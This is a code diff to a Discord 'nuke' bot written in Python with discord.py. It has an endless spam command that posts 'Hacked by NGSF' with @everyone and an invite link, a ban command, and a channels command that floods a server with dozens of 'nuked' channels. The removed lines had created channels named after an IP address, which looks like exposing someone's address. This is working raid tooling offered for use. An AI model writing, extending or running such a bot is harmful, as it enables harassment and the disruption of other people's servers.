@@ -16,16 +16,7 @@ import sys
 import traceback
 import json
 from discord.utils import get
- 
- 
- 
- 
- ##THIS BOT IS NOT WORKING ANYMORE##
- 
-##PREFIX##
 
-
- 
 bot = commands.Bot(command_prefix='.ngsf-')
  
 client = commands.Bot(command_prefix='.ngsf-')
@@ -39,8 +30,8 @@ bot.remove_command('help')
 @bot.event
 async def on_ready():
 #BOT STATUS#
-    print("t'es prêt pour faire du sale ? ")
-    print("Ok gros chu co !")
+    print("BOT STARTED")
+    print("CONNECTED TO DISCORD!")
  
  
  
@@ -53,7 +44,7 @@ async def ban(ctx, member : discord.Member):
  
 ##SPAM COMMAND##
 @bot.command(pass_context=True)
-async def spam(ctx): #run "!spam" to run the command
+async def spam(ctx):
     await ctx.message.delete()
     while True:
         await ctx.send("Hacked by NGSF https://discord.gg/jwyb63N @everyone")
@@ -92,7 +83,7 @@ async def roles(ctx):
 async def channels(ctx):
     await ctx.message.delete()
     guild = ctx.message.guild
-    await guild.create_text_channel('nuked') #you can change the channel name by replacing 'nuked' to any name
+    await guild.create_text_channel('nuked') 
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
@@ -174,35 +165,16 @@ async def channels(ctx):
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('NGSF > ALL')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('NGSF > ALL')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('NGSF > ALL')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
@@ -216,6 +188,25 @@ async def channels(ctx):
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked4')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('NGSF > ALL')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('NGSF > ALL')
+    await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
@@ -227,22 +218,22 @@ async def channels(ctx):
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('NGSF > ALL')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('nuked')
+    await guild.create_text_channel('vnuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('NGSF > ALL')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('NGSF > ALL')
-    await guild.create_text_channel('nuked')
-    await guild.create_text_channel('88.121.178.164')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
     await guild.create_text_channel('nuked')
